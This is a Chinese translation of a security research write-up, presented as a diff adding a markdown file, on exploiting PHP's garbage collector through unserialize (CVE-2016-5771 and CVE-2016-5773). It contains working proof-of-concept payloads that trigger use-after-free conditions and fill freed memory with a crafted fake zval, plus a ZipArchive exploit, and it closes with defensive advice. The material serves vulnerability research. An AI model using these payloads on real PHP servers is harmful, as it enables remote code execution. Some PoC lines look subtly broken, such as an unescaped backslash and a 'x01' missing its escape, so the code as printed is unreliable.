@@ -1,0 +1,279 @@
+# 如何攻破PHP的垃圾回收和反序列化机制（下）
+
+阅读量 **163117**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-06-28 15:00:12
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：evonide.com
+
+原文地址：<https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t01d701fa5f4e4ad5d5.jpg)
+
+## 传送门
+
+[如何攻破PHP的垃圾回收和反序列化机制（上）](https://www.anquanke.com/post/id/149421)
+
+在上篇文章中，我们针对“为什么外部数组完全被释放？”这一问题进行了详尽的分析，最终证明，造成该漏洞的主要原因是ArrayObject缺少垃圾回收函数。我们将该漏洞称为“双递减漏洞”，漏洞报告如下（CVE-2016-5771）：
+<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771> 。  
+然而，由于在不经过对反序列化进行调整的前提下，我们无法触发这一漏洞，因此还不能仅凭借此漏洞来实现远程代码执行。  
+本篇文章中将继续进行探究和分析，最终得出结论，并给出完整的漏洞利用方法。
+
+## 4 解决远程利用问题
+
+现在，我们仍然需要回答开头提出的剩下两个问题。其中之一是，是否有必要手动调用gc_collect_cycles？
+
+###  4.1 在反序列化过程中触发垃圾回收机制
+
+我们在思考，是否能够首先触发垃圾回收机制。如前所述，有一种方法可以自动调用垃圾回收进程，该进程将会超出具有潜在根元素的垃圾回收缓冲区。我发现了如下简单的技巧。
+
+    
+    
+    //Triggering GC during unserialization
+    define("GC_ROOT_BUFFER_MAX_ENTRIES", 10000);
+    define("NUM_TRIGGER_GC_ELEMENTS", GC_ROOT_BUFFER_MAX_ENTRIES+5);
+    $overflow_gc_buffer = str_repeat('i:0;a:0:{}', NUM_TRIGGER_GC_ELEMENTS);
+    $trigger_gc_serialized_string = 'a:'.(NUM_TRIGGER_GC_ELEMENTS).':{'.$overflow_gc_buffer.'}';
+    unserialize($trigger_gc_serialized_string);
+    
+
+通过在gdb中检查上述内容，我们看到gc_collect_cycles确实被调用了。由于反序列化过程允许一遍又一遍地传递相同的索引（在此例中索引为0），所以这一技巧能够成功。一旦重新使用数组的索引，旧元素的引用计数器就会递减。在反序列化过程中将会调用zend_hash_update，它将调用旧元素的析构函数（Destructor）。  
+每当zval被销毁时，都会涉及到垃圾回收算法。这也就意味着，所有创建的数组都会开始填充垃圾缓冲区，直至超出其空间导致对gc_collect_cycles的调用。  
+上述情况对漏洞利用来说无疑是好消息，目标系统不再需要手动调用垃圾回收过程。但是，还有一些新问题随之出现，事情变得更加棘手。
+
+###  4.2 解决反序列化问题
+
+就算我们能够在反序列化过程中调用垃圾回收，双递减漏洞是否仍然能在反序列化上下文中有效呢？经过测试，我们发现答案是否定的，其原因在于反序列化期间所有元素的引用计数器值都大于完成后的值。特别是，反序列化过程会跟踪所有未序列化的元素，以允许设置引用。全部条目都存储在列表var_hash中。一旦反序列化过程即将完成，就会破坏函数var_destroy中的条目。  
+我们举例说明此问题：
+
+    
+    
+    $reference_count_test = unserialize('a:2:{i:0;i:1337;i:1;r:2;}');
+    debug_zval_dump($reference_count_test);
+    /*
+    Result:
+    array(2) refcount(2){
+      [0]=>
+      long(1337) refcount(2)
+      [1]=>
+      long(1337) refcount(2)
+    }
+    */
+    
+
+反序列化完成后，1337整数zval的引用计数器为2。如果我们在反序列化终止之前设置一个断点（例如，在返回之前调用var_destroy的位置）并转储var_hash的内容，将可以看到以下的引用计数：
+
+    
+    
+    [0x109e820] (refcount=2) array(2): {
+        0 => [0x109cf70] (refcount=4) long: 1337
+        1 => [0x109cf70] (refcount=4) long: 1337
+      }
+    
+
+我们此前分析过的双递减漏洞允许我们将特定元素的引用计数减少两次。但根据上述内容，我们发现，针对每个在特定元素上的附加引用，我们必须让引用计数增加2。  
+就在陷入瓶颈的过程中，我突然想到：ArrayObject的反序列化函数接受对另一个数组的引用，以用于初始化的目的。这也就意味着，一旦我们对一个ArrayObject进行反序列化后，就可以引用任何之前已经被反序列化过的数组。此外，这还将允许我们将整个哈希表中的所有条目递减两次。具体步骤如下：  
+1、得到一个应被释放的目标zval X；  
+2、创建一个数组Y，其中包含几处对zval X的引用：array(ref_to_X, ref_to_X, […], ref_to_X)；  
+3、创建一个ArrayObject，它将使用数组Y的内容进行初始化，因此会返回一次由垃圾回收标记算法访问过的数组Y的所有子元素。  
+通过上述步骤，我们可以操纵标记算法，对数组Y中的所有引用实现两次访问。但是，在反序列化过程中创建引用将会导致引用计数器增加2，所以还要找到解决方案：  
+4、使用与步骤3相同的方法，额外再创建一个ArrayObject。  
+一旦标记算法访问第二个ArrayObject，它将开始对数组Y中的所有引用进行第三次递减。我们现在就有方法能够使引用计数器递减，可以将该方法用于对任意目标zval的引用计数器实现清零。  
+由于这些ArrayObject用于对目标引用计数器实现递减，所以我们将其称为“DecrementorObject”。  
+尽管现在已经能够清零任意目标zval的引用计数器，但垃圾回收算法依然没有释放……
+
+###  4.3 破坏引用计数器递减的证据
+
+经过大量调试后，我发现此前的步骤存在一个关键问题。我此前一直认为，如果一个节点被标记为白色，那么它一定会被释放。然而事实证明，即使一个节点被标记为白色，它后续也可能再次被标记为黑色。  
+请认真考虑如下步骤进行后所发生的情况：  
+1、gc_mark_roots和zval_mark_grey将我们的目标zval引用计数改为0；  
+2、垃圾回收机制将执行gc_scan_roots，从而确认哪些zval可以被标记为白色，哪些应该被标记为黑色；（在这一步中，由于其引用计数为0，我们的目标zval被标记为白色）  
+3、一旦这个函数访问DecrementorObject，就会检测到其引用计数大于0，并将其自身及子项全都标记为黑色，然而我们的目标zval也是其中的一个子项，因此目标zval将再次被标记为黑色。  
+总而言之，我们需要消除掉递减的“证据”。特别是，我们需要确保在zval_mark_grey完成后，DecremtorObject的引用计数器也变为0。经过进一步思考，我提出了如下解决方案：
+
+    
+    
+      array( ref_to_X, ref_to_X,  DecrementorObject, DecrementorObject)
+      -----                       ------------------------------------    /*  |                                          |
+    target_zval                     each one is initialized with the
+        X                                 contents of array X
+    */
+    
+
+该方案的好处在于，DecrementorObject现在也会减少其自身的引用计数。这将有助于帮我们实现一种状态，在gc_mark_roots访问完所有zval后，使目标数组及其所有子节点的引用计数为0。按照这种思路，我们的示例如下：
+
+    
+    
+    define("GC_ROOT_BUFFER_MAX_ENTRIES", 10000);
+    define("NUM_TRIGGER_GC_ELEMENTS", GC_ROOT_BUFFER_MAX_ENTRIES+5);
+    // Overflow the GC buffer.
+    $overflow_gc_buffer = str_repeat('i:0;a:0:{}', NUM_TRIGGER_GC_ELEMENTS);
+    // The decrementor_object will be initialized with the contents of our target array ($free_me).
+    $decrementor_object = 'C:11:"ArrayObject":19:{x:i:0;r:3;;m:a:0:{}}';
+    // The following references will point to the $free_me array (id=3) within unserialize.
+    $target_references = 'i:0;r:3;i:1;r:3;i:2;r:3;i:3;r:3;';
+    // Setup our target array i.e. an array that is supposed to be freed during unserialization.
+    $free_me = 'a:7:{'.$target_references.'i:9;'.$decrementor_object.'i:99;'.$decrementor_object.'i:999;'.$decrementor_object.'}';
+    // Increment each decrementor_object reference count by 2.
+    $adjust_rcs = 'i:99;a:3:{i:0;r:8;i:1;r:12;i:2;r:16;}';
+    // Trigger the GC and free our target array.
+    $trigger_gc = 'i:0;a:'.(2 + NUM_TRIGGER_GC_ELEMENTS).':{i:0;'.$free_me.$adjust_rcs.$overflow_gc_buffer.'}';
+    // Add our GC trigger and add a reference to the target array.
+    $payload = 'a:2:{'.$trigger_gc.'i:0;r:3;}';
+    var_dump(unserialize($payload));
+    /*
+    Result:
+    array(1) {
+      [0]=>
+      int(140531288870456)
+    }
+    */
+    
+
+如你所见，现在不再需要手动调用gc_collect_roots。并且其结果表明，我们的目标数组（例如$free_me）被释放，并且还发生了一些其他奇怪的事情，最终我们能够得到一个堆地址。  
+发生这种情况的原因是：  
+1、触发垃圾回收机制，目标数组将被释放，然后垃圾回收终止，并将控制权交回反序列化过程。  
+2、释放的空间被将要定义的下一个zval覆盖。  
+在这里请注意，我们通过使用许多连续的“i:0;a:0:{}”来触发垃圾回收。因此，一旦某个特定元素触发了垃圾回收机制，在此之后将要创建的下一个zval是“i:0;”，这是将要定义的下一个数组的索引整数。换而言之，我们有一个字符串，例如“[…]i:0;a:0:{}
+X i:0;a:0:{} X i:0;a:0:{}[…]”，其中垃圾回收机制在任意X处触发，之后反序列化过程将继续反序列化填充先前释放空间的数据。  
+3、因此，我们释放的空间就会临时包含这个整数zval。当反序列化即将结束时，会调用var_destroy，然后释放这个整数元素。内存管理器将使用最后一个释放的空间的地址覆盖这个释放的空间的第一个字节。但是，上一个zval的类型（即整型）将会保留。  
+因此，我们最终看到了一个堆地址。要理解这个过程可能会很复杂，但最重要的是大家要理解垃圾回收机制出发的位置，以及这一过程中会生成新的值来填充已释放空间的位置。  
+现在，我们在上述基础上，来关注如何对释放的空间进行控制。
+
+###  4.4 控制释放后的空间
+
+控制释放后空间的标准过程是用假的zval对其进行填充。通过使用悬挂指针，我们可以实现一些事情，例如泄露内存，或是控制CPU的指令指针。  
+为了利用释放后的空间，我们首先必须进行一些调整：  
+1、必须释放多个变量，以便我们可以用假zval字符串的内容填充其中一个释放后的空间，而不是用假zval字符串的zval填充释放的空间。  
+2、在使用假zval字符串的zval填充释放后空间之后，我们必须使这些释放空间“稳定”。如果忽略了这一步，反序列化过程会释放我们的假zval字符串，也就破坏了我们的假zval。  
+3、必须确保释放后的空间和我们创建的假zval字符串正确对其。此外，我们必须确保一旦垃圾回收机制完成后，释放后空间要立即被假zval字符串填充。为了实现这一目的，我想出了一个“三明治”技术。  
+针对“三明治”技术，我们不会在本文中详细讨论，只提供如下PoC：
+
+    
+    
+    define("GC_ROOT_BUFFER_MAX_ENTRIES", 10000);
+    define("NUM_TRIGGER_GC_ELEMENTS", GC_ROOT_BUFFER_MAX_ENTRIES+5);
+    // Create a fake zval string which will fill our freed space later on.
+    $fake_zval_string = pack("Q", 1337).pack("Q", 0).str_repeat("x01", 8);
+    $encoded_string = str_replace("%", "\", urlencode($fake_zval_string));
+    $fake_zval_string = 'S:'.strlen($fake_zval_string).':"'.$encoded_string.'";';
+    // Create a sandwich like structure:
+    // TRIGGER_GC;FILL_FREED_SPACE;[...];TRIGGER_GC;FILL_FREED_SPACE
+    $overflow_gc_buffer = '';
+    for($i = 0; $i < NUM_TRIGGER_GC_ELEMENTS; $i++) {
+        $overflow_gc_buffer .= 'i:0;a:0:{}';
+        $overflow_gc_buffer .= 'i:'.$i.';'.$fake_zval_string;
+    }
+    // The decrementor_object will be initialized with the contents of our target array ($free_me).
+    $decrementor_object = 'C:11:"ArrayObject":19:{x:i:0;r:3;;m:a:0:{}}';
+    // The following references will point to the $free_me array (id=3) within unserialize.
+    $target_references = 'i:0;r:3;i:1;r:3;i:2;r:3;i:3;r:3;';
+    // Setup our target array i.e. an array that is supposed to be freed during unserialization.
+    $free_me = 'a:7:{i:9;'.$decrementor_object.'i:99;'.$decrementor_object.'i:999;'.$decrementor_object.$target_references.'}';
+    // Increment each decrementor_object reference count by 2.
+    $adjust_rcs = 'i:99999;a:3:{i:0;r:4;i:1;r:8;i:2;r:12;}';
+    // Trigger the GC and free our target array.
+    $trigger_gc = 'i:0;a:'.(2 + NUM_TRIGGER_GC_ELEMENTS*2).':{i:0;'.$free_me.$adjust_rcs.$overflow_gc_buffer.'}';
+    // Add our GC trigger and add a reference to the target array.
+    $stabilize_fake_zval_string = 'i:0;r:4;i:1;r:4;i:2;r:4;i:3;r:4;';
+    $payload = 'a:6:{'.$trigger_gc.$stabilize_fake_zval_string.'i:4;r:8;}';
+    $a = unserialize($payload);
+    var_dump($a);
+    /*
+    Result:
+    array(5) {
+    [...]
+      [4]=>
+      int(1337)
+    }
+    */
+    
+
+最终，我们可以手工创建一个整型变量。  
+此时，我们准备的Payload已经可以用于远程漏洞利用。需要特别提出的是，这里的Payload还有一些可优化的空间。例如，通过对最后20%连续的“i:0;a:0:{}”元素应用“三明治”技术，可以进一步减少Payload的大小。
+
+## 5 ZipArchive类UAF漏洞
+
+我们发现的另一个漏洞是CVE-2016-5773（ <https://bugs.php.net/bug.php?id=72434> ；
+<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5773>
+）。该漏洞的成因在于一个类似的问题，在ZipArchive类中遗漏了一个垃圾回收函数。然而，该漏洞的利用与我们此前讨论的漏洞则完全不同。  
+我们前文曾说过：由于zval引用计数器的暂时递减，可能会导致一些影响（例如：对已经递减的引用计数器再次进行检查，或对其进行其他操作），从而造成严重后果。  
+而这里正是这一问题可以被滥用的具体场景。首先通过标记算法使引用计数器出现问题，然后调用php_zip_get_properties（而不是调用一个有效的垃圾回收函数），我们就可以释放一个特定的元素。  
+该漏洞的PoC如下：
+
+    
+    
+    $serialized_string = 'a:1:{i:0;a:3:{i:1;N;i:2;O:10:"ZipArchive":1:{s:8:"filename";i:1337;}i:1;R:5;}}';
+    $array = unserialize($serialized_string);
+    gc_collect_cycles();
+    $filler1 = "aaaa";
+    $filler2 = "bbbb";
+    var_dump($array[0]);
+    /*
+    Result:
+    array(2) {
+      [1]=>
+      string(4) "bbbb"
+    [...]
+    */
+    
+
+需要注意的是，在正常情况下，设置对尚未反序列化的zval的引用是不可能实现的。这一漏洞的Payload利用了一个小技巧来绕过这个限制：
+
+    
+    
+      [...] i:1;N; [...] s:8:"filename";i:1337; [...] i:1;R:REF_TO_FILENAME; [...]
+    
+
+Payload首先会创建一个带有索引1的NULL条目，随后使用对文件名的引用来覆盖此条目。垃圾回收机制将只能看到“i:1;REF_TO_FILENAME;
+[…] s:8:”filename”;i:1337;
+[…]”。这个技巧是非常必要的，因为我们需要确保“文件名”整数zval的引用计数器在产生影响之前已经被修改。
+
+## 6 结论
+
+发现远程漏洞利用的相关漏洞是一项非常艰巨的任务。正如大家所见到的，每当我解决了一个问题之后，就又有一个新问题出现在面前。在这篇文章中，我们采用了一种能够解决高复杂度问题的方法，逐一攻破难点，最终实现了目标。  
+此外，我们发现两个完全无关的PHP组件反序列化和垃圾回收具有相互作用，这个发现是非常有趣的。在这次研究中，我亲自分析了这些组件的行为，并从中收获了不少乐趣。在这里，我建议各位读者也可以复现本文的全部或部分过程，以对这些漏洞有更深的体会。  
+在这里，我们已经对反序列化进行了利用。但是，至少对于本地开发而言，是否使用反序列化是可以选择的。我们在这里所发现的漏洞与在早期PHP版本中发现的低技术含量反序列化问题是完全不同的。但其防范方法都是一样：开发者不应使用用户输入的反序列化，应选用JSON这样不太复杂的序列化方法。  
+最后，通过本文的概念证明以及对其中一个漏洞的实际利用，我们发现了pornhub.com的远程代码执行安全问题。这一安全问题也佐证了PHP的垃圾回收机制是一个非常有趣的攻击面。
+
+审核人：yiwang 编辑：少爷
+
+本文翻译自evonide.com [原文链接](https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **P!chu** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/149424](/post/id/149424)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [evonide.com](https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/)
+
+如若转载,请注明出处： <https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [PHP](/tag/PHP)
+  * [反序列化](/tag/反序列化)
+  * [垃圾回收](/tag/垃圾回收)
+
+ **+1** __1赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
